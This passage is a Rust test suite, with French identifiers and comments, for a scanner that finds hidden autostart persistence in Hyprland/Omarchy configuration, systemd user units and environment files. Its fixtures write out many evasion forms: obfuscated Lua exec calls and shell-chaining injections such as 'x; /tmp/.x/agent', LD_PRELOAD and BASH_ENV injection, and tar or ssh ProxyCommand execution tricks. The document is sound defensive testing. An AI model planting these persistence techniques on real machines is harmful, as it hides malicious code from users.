            "local cmd = \"kitty\"\nfor _, cmd in ipairs{\"/tmp/.x/agent\"} do hl.exec_cmd(cmd) end\n",
            "local cmd = \"kitty\"\nfor cmd in pairs{[\"/tmp/.x/agent\"] = 1} do hl.exec_cmd(cmd) end\n",
            "local function run() hl.exec_cmd(c) end\nlocal c = \"kitty\"\n_G.c = \"/tmp/.x/agent\"\nrun()\n",
            "local c = \"kitty\"\nrawset(_G, \"c\", \"/tmp/.x/agent\")\n",
            "local function run(...) hl.exec_cmd(...) end\nrun(\"/tmp/.x/agent\")\n",
            "hl.exec_cmd(os.getenv(\"ZZ\") .. \"/agent\")\n",
            "hl.exec_cmd(\"kitty \" .. os.getenv(\"ZZ\"))\n",
            "hl[\"exec\" .. \"_cmd\"](\"/tmp/.x/agent\")\n",
            "local k = \"exec_cmd\"\nhl[k](\"/tmp/.x/agent\")\n",
            "local h = hl\nh[\"exec\" .. \"_cmd\"](\"/tmp/.x/agent\")\n",
            "for k, f in pairs(os) do if k == \"execute\" then f(\"/tmp/.x/agent\") end end\n",
            "-- c\rhl.exec_cmd(\"/tmp/.x/agent\")\n",
            "o.shell_succeeds(\"/tmp/.x/agent\")\n",
            "o.bind(\"SUPER + X\", \"X\", { omarchy = \"x; /tmp/.x/agent\" })\n",
            "o.bind(\"SUPER + X\", \"X\", { menu = \"x; /tmp/.x/agent\" })\n",
            "o.bind(\"SUPER + X\", \"X\", o.launch_webapp(\"x; /tmp/.x/agent\"))\n",
            "hl.exec_cmd(o.launch_webapp(\"x; /tmp/.x/agent\"))\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("verif2-lua-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(
                c.message.contains("~/.config/hypr/hyprland.lua"),
                "{texte:?} : {}",
                c.message
            );
        }
        // Ce que « require » et « dofile » chargent hors des dossiers lus (chemin de modules d'Omarchy : ~/.local/state,
        // ~/.config), introuvable, ou d'un chemin calculé : levé.
        for (i, (texte, module)) in [
            ("require(\"zz.agent\")\n", Some(".config/zz/agent.lua")),
            ("require(\"zz.agent\")\n", Some(".local/state/zz/agent.lua")),
            ("require(\"absent\")\n", None),
            (
                "dofile(os.getenv(\"HOME\") .. \"/.config/zz.lua\")\n",
                Some(".config/zz.lua"),
            ),
            (
                "dofile(\"/home/alice/.config/hypr/zz.txt\")\n",
                Some(".config/hypr/zz.txt"),
            ),
            ("dofile(nil or \"/usr/share/omarchy/x.lua\")\n", None),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("verif2-lua-charge-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", texte);
            if let Some(f) = module {
                m.ecrire(f, "hl.exec_cmd(\"kitty\")\n");
            }
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(
                c.message.contains("~/.config/hypr/hyprland.lua:1"),
                "{texte:?} : {}",
                c.message
            );
        }
        // Le modèle d'Omarchy (chemin par défaut de OMARCHY_PATH, modules de ~/.config/hypr) : rien.
        let m = Maison::nouvelle("verif2-lua-charge-sain");
        m.ecrire(
            ".config/hypr/hyprland.lua",
            "dofile((os.getenv(\"OMARCHY_PATH\") or \"/usr/share/omarchy\") .. \"/default/hypr/bootstrap.lua\")\n\
             require(\"hypr.monitors\")\nrequire(\"omarchy.current.theme.hyprland\")\n",
        );
        m.ecrire(
            ".config/hypr/monitors.lua",
            "hl.monitor({ output = \"\", mode = \"preferred\" })\n",
        );
        m.ecrire(
            ".config/omarchy/current/theme/hyprland.lua",
            "hl.config({ general = { gaps_in = 5 } })\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
        // Le retour chariot seul compte une ligne, comme pour Lua : l'appel est à la ligne 2.
        let m = Maison::nouvelle("verif2-lua-cr");
        m.ecrire(".config/hypr/hyprland.lua", "-- c\rhl.exec_cmd(\"/tmp/.x/agent\")\r\n");
        let c = m.lancements();
        assert!(c.message.contains("~/.config/hypr/hyprland.lua:2"), "{}", c.message);
    }

    /// B5, B6 : les dossiers d'unités que systemd lit en plus (user.attached, XDG_CONFIG_DIRS, XDG_DATA_DIRS que le
    /// compte peut changer, le dossier de session de systemd quand XDG_RUNTIME_DIR mène ailleurs) se lisent.
    #[test]
    fn dossiers_d_unites_de_systemd_lus() {
        const AGENT: &str = "[Service]\nExecStart=%h/.x/agent\n";
        for (i, (unite, variables)) in [
            (".config/systemd/user.attached/agent.service", vec![]),
            (
                ".xdgc/systemd/user/agent.service",
                vec![("XDG_CONFIG_DIRS", "/home/alice/.xdgc:/etc/xdg")],
            ),
            (
                ".local/share/flatpak/exports/share/systemd/user/agent.service",
                vec![(
                    "XDG_DATA_DIRS",
                    "/home/alice/.local/share/flatpak/exports/share:/usr/share",
                )],
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-unites-{i}"));
            m.ecrire(unite, AGENT);
            let c = m.lancements_avec(&variables);
            let r = leve_non_declarable(&c, unite);
            assert!(c.message.contains(&format!("~/{unite}:2")), "{}", c.message);
            assert!(r.contains("lit en plus"), "{r}");
        }
        // B6 : XDG_RUNTIME_DIR ailleurs ; le dossier de session de systemd se lit quand même, et l'écart se dit.
        let m = Maison::nouvelle("relecture-unites-session");
        let f = m.racine.join("run/user/1000/systemd/user/agent.service");
        std::fs::create_dir_all(f.parent().unwrap()).unwrap();
        std::fs::write(&f, AGENT).unwrap();
        let c = m.lancements_avec(&[("XDG_RUNTIME_DIR", "/run/user/autre")]);
        leve_non_declarable(&c, "session");
        assert!(
            c.message.contains("/run/user/1000/systemd/user/agent.service:2"),
            "{}",
            c.message
        );
        assert!(
            c.message.contains("XDG_RUNTIME_DIR mène à /run/user/autre"),
            "{}",
            c.message
        );
        // Un dossier de XDG_DATA_DIRS à root seul (celui du système) n'est pas « en plus ».
        let m = Maison::nouvelle("relecture-unites-sain");
        let c = m.lancements_avec(&[("XDG_DATA_DIRS", "/usr/share"), ("XDG_CONFIG_DIRS", "/etc/xdg")]);
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// D-2 (relecture 0.94) : XDG_RUNTIME_DIR changé ne déplace pas le dossier de session de systemd
    /// (/run/user/<uid>) en fin de liste : l'ordre est celui de la vraie session, chaque dossier de la variable juste
    /// après celui de systemd ; /run/user/<uid>/systemd/user passe donc toujours avant /usr/lib/systemd/user.
    #[test]
    fn un_xdg_runtime_dir_change_garde_l_ordre_de_systemd() {
        let uid = uid_du_compte().expect("uid du compte");
        let vrai = format!("/run/user/{uid}");
        let maison = Path::new("/home/alice");
        let ordre = |runtime: &str| {
            let runtime = std::ffi::OsString::from(runtime);
            dossiers_d_unites_du_compte(maison, |v| (v == "XDG_RUNTIME_DIR").then(|| runtime.clone())).unwrap()
        };
        let attendu = ordre(&vrai);
        let faux = ordre("/tmp/faux");
        let sans_la_variable: Vec<_> = faux.iter().filter(|d| !d.starts_with("/tmp/faux")).cloned().collect();
        assert_eq!(sans_la_variable, attendu, "ordre de systemd perdu : {faux:#?}");
        for d in DOSSIERS_DE_LA_SESSION {
            let de_systemd = faux.iter().position(|p| *p == Path::new(&vrai).join(d));
            let de_la_variable = faux.iter().position(|p| *p == Path::new("/tmp/faux").join(d));
            assert!(
                de_systemd.zip(de_la_variable).is_some_and(|(a, b)| b == a + 1),
                "{d} : {faux:#?}"
            );
        }
        let place = |p: &str| faux.iter().position(|d| d == Path::new(p));
        assert!(
            place(&format!("{vrai}/systemd/user")) < place("/usr/lib/systemd/user"),
            "{faux:#?}"
        );
    }

    /// C1, C2, C3, C5 : une ligne d'unité se juge telle que systemd la lit (BOM en tête de ligne, chemin simplifié,
    /// « % » remplacés, échappements et guillemets décodés, chaque commande d'une ligne, tous les préfixes) ; les
    /// réglages qui changent ce qui se lance sans ligne Exec sont levés.
    #[test]
    fn unite_lue_comme_systemd() {
        for (i, service) in [
            "\u{feff}ExecStart=/tmp/.x/agent\n",
            "ExecStart=//tmp/.x/agent\n",
            "ExecStart=/var/../tmp/.x/agent\n",
            "ExecStart=%T/.x/agent\n",
            "ExecStart=%h//.x/agent\n",
            "ExecStart=\\x2ftmp/.x/agent\n",
            "ExecStartPre=/usr/bin/true ; /tmp/.x/agent\nExecStart=/usr/bin/true\n",
            "ExecStart=|/tmp/.x/agent\n",
            "Environment=LD_PRELOAD=/usr/lib/libz.so\nExecStart=/usr/bin/true\n",
            "ExecSearchPath=%h/.x\nExecStart=agent\n",
            "Environment=\"PATH=%h/.x:/usr/bin\"\nExecStart=agent\n",
            "EnvironmentFile=%h/.x/variables\nExecStart=/usr/bin/true\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-systemd-{i}"));
            m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{service}"));
            let c = m.lancements();
            leve_non_declarable(&c, service);
            assert!(
                c.message.contains("~/.config/systemd/user/a.service:"),
                "{service:?} : {}",
                c.message
            );
        }
        // Ramenées à leur forme finale, ces lignes se déclarent comme la même ligne écrite simplement.
        for (i, service) in ["ExecStart=/t\"mp/.x/\"agent\n", "ExecStart=-:/tmp/.x/agent\n"]
            .into_iter()
            .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-systemd-simple-{i}"));
            m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{service}"));
            leve(&m.lancements(), service);
        }
        // Même trou côté .desktop et Hyprland : « //tmp ».
        let m = Maison::nouvelle("relecture-systemd-desktop");
        m.ecrire(
            ".config/autostart/a.desktop",
            "[Desktop Entry]\nType=Application\nExec=//tmp/.x/agent\n",
        );
        leve_non_declarable(&m.lancements(), "desktop");
        let m = Maison::nouvelle("relecture-systemd-hypr");
        m.ecrire(".config/hypr/hyprland.conf", "exec-once = //tmp/.x/agent\n");
        leve_non_declarable(&m.lancements(), "hypr");
        // Des réglages ordinaires ne lèvent rien.
        let m = Maison::nouvelle("relecture-systemd-sain");
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nEnvironment=LANG=fr_CA.UTF-8 \"PATH=/usr/local/bin:/usr/bin\"\nEnvironmentFile=-%h/.config/a.env\n\
             ExecStartPre=-/usr/bin/true\nExecStart=/usr/bin/sleep 60\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// C4 : un dossier d'ajouts (« .d ») qui est un lien vers un autre dossier est suivi, comme systemd le suit.
    #[test]
    fn dossier_d_ajouts_en_lien_suivi() {
        let m = Maison::nouvelle("relecture-lien-d");
        m.ecrire(".config/systemd/user/a.service", "[Service]\nExecStart=/usr/bin/true\n");
        m.ecrire(".x/d/z.conf", "[Service]\nExecStart=\nExecStart=%h/.x/agent\n");
        std::os::unix::fs::symlink(m.chemin(".x/d"), m.chemin(".config/systemd/user/a.service.d")).unwrap();
        let c = m.lancements();
        leve_non_declarable(&c, "lien .d");
        assert!(c.message.contains("lien vers ~/.x/d"), "{}", c.message);
        assert!(
            c.message.contains("~/.config/systemd/user/a.service.d/z.conf:3"),
            "{}",
            c.message
        );
    }

    // ---- Relecture adverse 2 (N1 à N11) : chaque forme levée, jamais déclarable. Valeurs inventées. ----

    /// N1 : une ligne « exec » de Hyprland passe par « /bin/sh -c » : chaque commande simple se juge (après « && »,
    /// « ; », « | », « & », dans « ( ) », « { } », « $( ) », après un « cd », une affectation ou une redirection) ; ce
    /// qui ne se coupe pas sûrement est dit.
    #[test]
    fn ligne_de_shell_de_hyprland_coupee() {
        for (i, commande) in [
            "sleep 2 && /tmp/.x/agent",
            "sleep 1; /tmp/.x/agent",
            "cd /tmp/.x; ./agent",
            "cd ~/.x && ./agent",
            "false || /tmp/.x/agent",
            "true | /tmp/.x/agent",
            "kitty&/tmp/.x/agent",
            "( /tmp/.x/agent )",
            "{ /tmp/.x/agent; }",
            "if true; then /tmp/.x/agent; fi",
            "FOO=1 /tmp/.x/agent",
            "</dev/null /tmp/.x/agent",
            "/tm\"\"p/.x/agent",
            "/t?p/.x/agent",
            "~bob/.x/agent",
            "\"$HOME\"/.x/agent",
            "echo `/tmp/.x/agent`",
            "echo $(/tmp/.x/agent)",
            "notify-send x; /tmp/.x/agent",
            "sh </tmp/.x/s",
            "bash -lc '/tmp/.x/agent'",
            "sh -c/tmp/.x/agent",
            "hyprctl dispatch exec /tmp/.x/agent",
            "env LD_PRELOAD=/usr/lib/x.so kitty",
            "/lib64/ld-linux-x86-64.so.2 ~/.x/agent",
            "gamemoderun ~/.x/agent",
            "xdg-terminal-exec ~/.x/agent",
            "omarchy-launch-or-focus x ~/.x/agent",
            "find / -maxdepth 0 -exec ~/.x/agent ;",
            "make -f ~/.x/mk",
            "vim -S ~/.x/s.vim",
            "git -c core.pager=~/.x/agent log",
            "ssh -oProxyCommand=~/.x/agent h",
            "tar -cf /dev/null --checkpoint-action=exec=~/.x/agent /etc/hostname",
            "python3 -c 'import os; os.system(\"~/.x/agent\")'",
            "echo 'non fermé",
            "/proc/self/root/tmp/.x/agent",
            "/run/user/1000/agent",
        ]
        .into_iter()
        .enumerate()
        {
            // Ce qui ne se lit pas sûrement ne se déclare pas normal ; le reste se montre tel quel.
            let non_lu = ["/t?p/.x/agent", "~bob/.x/agent", "echo 'non fermé"].contains(&commande);
            let m = Maison::nouvelle(&format!("relecture2-shell-{i}"));
            let texte = format!("exec-once = {commande}\n");
            m.ecrire(".config/hypr/hyprland.conf", &texte);
            let c = m.lancements();
            leve(&c, &texte);
            if non_lu {
                leve_non_declarable(&c, &texte);
            }
            let m = Maison::nouvelle(&format!("relecture2-shell-lua-{i}"));
            let texte = format!("hl.exec_cmd([[{commande}]])\n");
            m.ecrire(".config/hypr/autostart.lua", &texte);
            leve(&m.lancements(), &texte);
        }
        // Un raccourci aussi, et sa commande après une autre.
        let m = Maison::nouvelle("relecture2-shell-bind");
        m.ecrire(
            ".config/hypr/hyprland.conf",
            "bind = SUPER, Q, exec, notify-send x; /tmp/.x/agent\n",
        );
        leve(&m.lancements(), "bind");
        // Les lignes du modèle d'Omarchy ne lèvent rien.
        let m = Maison::nouvelle("relecture2-shell-sain");
        m.ecrire(
            ".config/hypr/autostart.lua",
            "hl.exec_cmd(\"sleep 2 && omarchy-hook post-boot\")\n\
             hl.exec_cmd(\"xsetroot -cursor_name left_ptr >/dev/null 2>&1 || true\")\n\
             hl.exec_cmd(\"pkill hyprpicker || hyprpicker -a\")\n\
             o.bind(\"SUPER + K\", \"Omarchy's menu\", \"omarchy-menu\")\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// N4, N5 : les codes et les variables d'une unité remplacés comme systemd les remplace (« %u », « %t »,
    /// « $A », « ${A} », « $$ ») ; une variable inconnue dans l'argument d'un interpréteur est dite.
    #[test]
    fn unite_codes_et_variables_remplaces() {
        for (i, service) in [
            "ExecStart=/home/%u/.x/agent\n",
            "ExecStart=%t/.x/agent\n",
            "ExecStart=/run/user/1000/agent\n",
            "ExecStart=/proc/self/root/tmp/.x/agent\n",
            "Environment=A=/tmp/.x/a.sh\nExecStart=/bin/sh ${A}\n",
            "Environment=A=/tmp/.x/a.sh\nExecStart=/bin/sh $A\n",
            "Environment=A=/tmp/.x/a.sh\nExecStart=/bin/sh -c ${A}\n",
            "ExecStart=/bin/sh -c \"$$HOME/.x/agent\"\n",
            "ExecStart=/bin/sh -c \"sleep 1; /tmp/.x/agent\"\n",
            "ExecStart=/bin/sh $INCONNUE\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture2-unite-{i}"));
            let texte = format!("[Service]\n{service}");
            m.ecrire(".config/systemd/user/a.service", &texte);
            leve(&m.lancements(), &texte);
        }
    }

    /// N6, N7, N8 : un réglage ou une variable qui mène à un dossier temporaire ou caché se juge comme la commande
    /// (dossier courant, entrée, racine, montages, variables d'injection, fichier de variables, Hyprland,
    /// environment.d, user.conf de systemd).
    #[test]
    fn reglages_et_variables_vers_un_dossier_cache() {
        for (i, service) in [
            "WorkingDirectory=/tmp/.x\nExecStart=/bin/sh a.sh\n",
            "WorkingDirectory=/tmp/.x\nExecStart=/usr/bin/python3 -m a\n",
            "StandardInput=file:/tmp/.x/a.sh\nExecStart=/bin/sh\n",
            "RootDirectory=/tmp/.x\nExecStart=/usr/bin/true\n",
            "BindPaths=/tmp/.x/a:/usr/bin/true\nExecStart=/usr/bin/true\n",
            "Environment=BASH_ENV=/tmp/.x/e\nExecStart=/bin/bash -c true\n",
            "Environment=PYTHONPATH=%h/.x\nExecStart=/usr/bin/python3 -m a\n",
            "Environment=NODE_OPTIONS=--require=/tmp/.x/a.js\nExecStart=/usr/bin/node a\n",
            "EnvironmentFile=%h/v.env\nExecStart=/usr/bin/true\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture2-reglage-{i}"));
            m.ecrire("v.env", "LD_PRELOAD=/usr/lib/x.so\n");
            let texte = format!("[Service]\n{service}");
            m.ecrire(".config/systemd/user/a.service", &texte);
            leve(&m.lancements(), &texte);
        }
        for (i, (fichier, texte)) in [
            (".config/hypr/hyprland.conf", "env = PATH,/tmp/.x:/usr/bin\n"),
            (".config/hypr/hyprland.conf", "env = BASH_ENV,~/.x/e\n"),
            (".config/environment.d/a.conf", "BASH_ENV=/tmp/.x/e\n"),
            (".config/environment.d/a.conf", "PATH=$HOME/.x:/usr/bin\n"),
            (
                ".config/systemd/user.conf",
                "[Manager]\nDefaultEnvironment=PATH=/tmp/.x:/usr/bin\n",
            ),
            (
                ".config/systemd/user.conf.d/a.conf",
                "[Manager]\nManagerEnvironment=\"BASH_ENV=/tmp/.x/e\"\n",
            ),
            (".profile", "export PYTHONSTARTUP=/tmp/.x/s.py\n"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture2-variable-{i}"));
            m.ecrire(fichier, texte);
            leve(&m.lancements(), texte);
        }
        // Des réglages ordinaires ne lèvent rien.
        let m = Maison::nouvelle("relecture2-reglage-sain");
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nWorkingDirectory=%h\nEnvironment=PATH=%h/.local/bin:/usr/bin\nExecStart=/usr/bin/sleep 60\n",
        );
        m.ecrire(
            ".config/environment.d/a.conf",
            "PATH=$HOME/.local/bin:$PATH\nEDITOR=nvim\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    impl Maison {
        /// Tous les constats de la persistance (les lancements d'abord, puis les copies d'Omarchy, les services).
        fn constats(&self) -> Vec<Constat> {
            persistance_dans(
                &self.racine,
                &self.racine.join("home/alice"),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            )
        }

        /// Un fichier sous la racine (hors du dossier personnel), dossiers compris.
        fn ecrire_hors(&self, absolu: &str, texte: &str) {
            let p = self.racine.join(absolu.trim_start_matches('/'));
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, texte).unwrap();
        }
    }

    /// N2 : au-delà de SOURCES_MAX fichiers inclus par « source », ceux qui suivent ne sont pas lus : c'est dit avec
    /// leur nombre, jamais déclarable (des lignes, un joker de 80 fichiers, une chaîne de 70). En deçà, la ligne qui
    /// lance se montre.
    #[test]
    fn sources_au_dela_de_la_borne_dites() {
        use std::fmt::Write as _;
        let agent = "exec-once = /tmp/.x/agent\n";
        for (nom, inclusions) in [("lignes", 70), ("temoin", 40)] {
            let m = Maison::nouvelle(&format!("relecture2-borne-{nom}"));
            let mut texte = String::new();
            for i in 0..inclusions {
                m.ecrire(&format!(".dotfiles/h/{i:02}.conf"), &format!("$a{i} = 1\n"));
                let _ = writeln!(texte, "source = ~/.dotfiles/h/{i:02}.conf");
            }
            texte.push_str("source = ~/.dotfiles/z.conf\n");
            m.ecrire(".dotfiles/z.conf", agent);
            m.ecrire(".config/hypr/hyprland.conf", &texte);
            let c = m.lancements();
            if inclusions > SOURCES_MAX {
                leve_non_declarable(&c, nom);
                assert!(c.message.contains("ne sont pas lus"), "{}", c.message);
            } else {
                leve(&c, nom);
                assert!(c.message.contains("~/.dotfiles/z.conf:1"), "{}", c.message);
            }
        }
        // Un joker qui prend 80 fichiers, celui qui lance en dernier.
        let m = Maison::nouvelle("relecture2-borne-joker");
        for i in 0..80 {
            let texte = if i == 79 {
                agent.to_string()
            } else {
                format!("$a{i} = 1\n")
            };
            m.ecrire(&format!(".dotfiles/j/{i:02}.conf"), &texte);
        }
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.dotfiles/j/*.conf\n");
        let c = m.lancements();
        leve_non_declarable(&c, "joker");
        assert!(c.message.contains("ne sont pas lus"), "{}", c.message);
        // Une chaîne de 70 fichiers, chacun inclut le suivant.
        let m = Maison::nouvelle("relecture2-borne-chaine");
        for i in 0..70_u32 {
            m.ecrire(
                &format!(".dotfiles/c/{i}.conf"),
                &format!("source = ~/.dotfiles/c/{}.conf\n", i.saturating_add(1)),
            );
        }
        m.ecrire(".dotfiles/c/70.conf", agent);
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.dotfiles/c/0.conf\n");
        let c = m.lancements();
        leve_non_declarable(&c, "chaîne");
        assert!(c.message.contains("ne sont pas lus"), "{}", c.message);
    }

    /// N3 : un joker dans la partie dossier d'un « source » (Hyprland le développe, Vanguard non) est dit, comme une
    /// inclusion depuis un dossier temporaire, même au contenu anodin.
    #[test]
    fn source_joker_de_dossier_et_temporaire_dits() {
        for (i, (ligne, attendu)) in [
            ("source = ~/.config/*/y.conf\n", "par un joker dans le dossier"),
            ("source = ~/.dotfiles/?/y.conf\n", "par un joker dans le dossier"),
            ("source = /tmp/.x/y.conf\n", "rangé dans un dossier temporaire"),
            ("source = /dev/shm/y.conf\n", "rangé dans un dossier temporaire"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture2-source-{i}"));
            m.ecrire(".config/a/y.conf", "$a = 1\n");
            m.ecrire(".dotfiles/a/y.conf", "$a = 1\n");
            m.ecrire_hors("/tmp/.x/y.conf", "$a = 1\n");
            m.ecrire_hors("/dev/shm/y.conf", "$a = 1\n");
            m.ecrire(".config/hypr/hyprland.conf", ligne);
            let c = m.lancements();
            leve_non_declarable(&c, ligne);
            assert!(c.message.contains(attendu), "{ligne:?} : {}", c.message);
        }
    }

    /// N10 : un sous-dossier de ~/.config/hypr qui est un lien vers un dossier est suivi (ses modules jugés) et dit ;
    /// un module trop profond pour être lu est dit. Jamais déclarable.
    #[test]
    fn dossier_de_modules_en_lien_ou_trop_profond_dit() {
        let agent = "hl.exec_cmd(\"/tmp/.x/agent\")\n";
        for (i, dans_la_maison) in [true, false].into_iter().enumerate() {
            let m = Maison::nouvelle(&format!("relecture2-lien-{i}"));
            let cible = if dans_la_maison {
                m.chemin("z")
            } else {
                m.racine.join("tmp/.x/lib")
            };
            std::fs::create_dir_all(&cible).unwrap();
            std::fs::write(cible.join("m.lua"), agent).unwrap();
            m.ecrire(".config/hypr/hyprland.lua", "require(\"a.m\")\n");
            std::os::unix::fs::symlink(&cible, m.chemin(".config/hypr/a")).unwrap();
            let c = m.lancements();
            leve_non_declarable(&c, "lien");
            assert!(c.message.contains("est un lien vers"), "{}", c.message);
            assert!(c.message.contains("~/.config/hypr/a/m.lua:1"), "{}", c.message);
        }
        let m = Maison::nouvelle("relecture2-profond");
        m.ecrire(".config/hypr/a/b/c/d/e/f/g/h/i/j/k/m.lua", agent);
        let c = m.lancements();
        leve_non_declarable(&c, "profond");
        assert!(c.message.contains("dossiers de profondeur"), "{}", c.message);
        // Témoin : à trois dossiers, le module se lit et sa ligne se montre.
        let m = Maison::nouvelle("relecture2-profond-temoin");
        m.ecrire(".config/hypr/a/b/c/m.lua", agent);
        let c = m.lancements();
        leve(&c, "témoin");
        assert!(c.message.contains("~/.config/hypr/a/b/c/m.lua:1"), "{}", c.message);
    }

    /// N11 : un module Lua posé là où le chargeur d'Omarchy le prend hors de ~/.config/hypr (état, configuration,
    /// thème, bascules, dispositions) est lu et jugé, jamais déclarable ; sous un XDG_STATE_HOME déplacé aussi.
    #[test]
    fn modules_d_omarchy_hors_de_hypr_lus() {
        let agent = "hl.exec_cmd(\"/tmp/.x/agent\")\n";
        let modules = [
            ".local/state/default/hypr/omarchy.lua",
            ".local/state/hypr/monitors.lua",
            ".config/default/hypr/omarchy.lua",
            ".local/state/omarchy/current/theme/hyprland.lua",
            ".config/omarchy/current/theme/hyprland.lua",
            ".local/state/omarchy/toggles/hypr/x.lua",
            ".local/state/omarchy/workspace-layouts/x.lua",
        ];
        // Chaque dossier du chargeur a son essai.
        for (d, _) in MODULES_D_OMARCHY {
            assert!(modules.iter().any(|m| m.starts_with(d)), "{d} sans essai");
        }
        for (i, module) in modules.into_iter().enumerate() {
            let m = Maison::nouvelle(&format!("relecture2-omarchy-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", "-- modèle\n");
            m.ecrire(module, agent);
            let c = m.lancements();
            leve_non_declarable(&c, module);
            assert!(c.message.contains(&format!("~/{module}:1")), "{module} : {}", c.message);
        }
        let m = Maison::nouvelle("relecture2-omarchy-etat");
        m.ecrire(".etat/omarchy/toggles/hypr/x.lua", agent);
        let c = m.lancements_avec(&[("XDG_STATE_HOME", "/home/alice/.etat")]);
        leve_non_declarable(&c, "XDG_STATE_HOME");
        assert!(
            c.message.contains("~/.etat/omarchy/toggles/hypr/x.lua:1"),
            "{}",
            c.message
        );
    }

    /// Point 8 de la deuxième vérification : une copie de la bibliothèque d'Omarchy ne se tait que si l'original est
    /// identique et à root seul. Ici l'original est au compte (essais sans root) : la copie reste jugée, rien ne se
    /// dit « copie conforme ».
    #[test]
    fn copie_d_omarchy_jugee_sans_original_de_root() {
        let texte = "hl.exec_cmd(\"/tmp/.x/agent\")\n";
        let m = Maison::nouvelle("relecture2-copie-compte");
        m.ecrire_hors("/usr/share/omarchy/default/hypr/x.lua", texte);
        m.ecrire(".config/hypr/x.lua", texte);
        m.ecrire(".config/hypr/default/hypr/x.lua", texte);
        let constats = m.constats();
        let c = constats.first().unwrap();
        leve(c, "copie");
        assert!(c.message.contains("~/.config/hypr/x.lua:1"), "{}", c.message);
        assert!(
            c.message.contains("~/.config/hypr/default/hypr/x.lua:1"),
            "{}",
            c.message
        );
        assert!(
            !constats.iter().any(|c| c.message.contains("copies conformes")),
            "un original au compte ne fait pas une copie conforme"
        );
    }

    /// Vérification 3, H5 : la logique de la copie conforme, le jugement « à root seul » remplacé, tourne aussi sous
    /// unshare (où rien n'est à root) : copie identique d'un original « à root », oui ; original au compte, contenu
    /// changé ou chemin relatif différent, non. Et la carte des identités : seule celle du système passe.
    #[test]
    fn copie_d_omarchy_selon_le_jugement_de_root() {
        let texte = "hl.exec_cmd(\"omarchy-lock-screen\")\n";
        let m = Maison::nouvelle("verif3-copie-selon");
        m.ecrire_hors("/usr/share/omarchy/default/hypr/x.lua", texte);
        m.ecrire(".config/hypr/default/hypr/x.lua", texte);
        m.ecrire(".config/hypr/default/hypr/y.lua", texte);
        m.ecrire(".config/hypr/x.lua", "-- changé\n");
        let r = Releveur {
            racine: m.racine.clone(),
            maison: m.chemin(""),
            ..Releveur::default()
        };
        let omarchy = m.racine.join("usr/share/omarchy");
        let a_root = |p: &Path| p.starts_with(&omarchy);
        let copie = m.chemin(".config/hypr/default/hypr/x.lua");
        assert_eq!(
            copie_d_omarchy_selon(&r, &copie, &a_root),
            Some(omarchy.join("default/hypr/x.lua"))
        );
        assert_eq!(
            copie_d_omarchy_selon(&r, &copie, &|_| false),
            None,
            "original au compte"
        );
        let sans_original = m.chemin(".config/hypr/default/hypr/y.lua");
        assert_eq!(copie_d_omarchy_selon(&r, &sans_original, &a_root), None);
        assert_eq!(
            copie_d_omarchy_selon(&r, &m.chemin(".config/hypr/x.lua"), &a_root),
            None,
            "contenu changé"
        );
        assert!(uid_sans_traduction("         0          0 4294967295\n"));
        assert!(!uid_sans_traduction("         0       1000          1\n"));
        assert!(!uid_sans_traduction("0 0 4294967295\n0 0 1\n"));
        assert!(!uid_sans_traduction(""));
    }

    /// Point 8 : la bibliothèque d'Omarchy du paquet (/usr/share/omarchy/default/hypr, à root) recopiée telle quelle
    /// dans ~/.config/hypr se dit en une ligne d'information, sans alerte ; un seul fichier changé se juge à
    /// nouveau. Demande la vraie bibliothèque, vue hors d'un espace de noms d'utilisateurs (le root qu'on y voit
    /// n'est pas celui du système).
    #[test]
    fn copie_conforme_de_la_bibliotheque_d_omarchy_dite() {
        let original = Path::new("/usr/share/omarchy/default/hypr");
        if !original.is_dir() {
            return crate::essais::saute("Omarchy absent : /usr/share/omarchy/default/hypr manque");
        }
        if !uid_sans_traduction(&std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default()) {
            return crate::essais::saute(
                "dans un espace de noms d'utilisateurs (unshare -r), rien n'est « à root seul » : à lancer hors de lui",
            );
        }
        let m = Maison::nouvelle("relecture2-copie-root");
        std::fs::create_dir_all(m.racine.join("usr/share")).unwrap();
        std::os::unix::fs::symlink("/usr/share/omarchy", m.racine.join("usr/share/omarchy")).unwrap();
        let mut lus = Vec::new();
        parcourir(original, 4, &mut lus, &|f| a_l_extension(f, "lua"));
        assert!(lus.len() > 5, "{lus:?}");
        for f in &lus {
            let rel = f.strip_prefix(original).unwrap();
            let copie = m.chemin(".config/hypr/default/hypr").join(rel);
            std::fs::create_dir_all(copie.parent().unwrap()).unwrap();
            std::fs::copy(f, &copie).unwrap();
        }
        let constats = m.constats();
        let c = constats.first().unwrap();
        assert_eq!(c.probleme, None, "{}", c.message);
        assert!(
            constats
                .iter()
                .any(|c| c.probleme.is_none() && c.message.contains("copies conformes")),
            "{:?}",
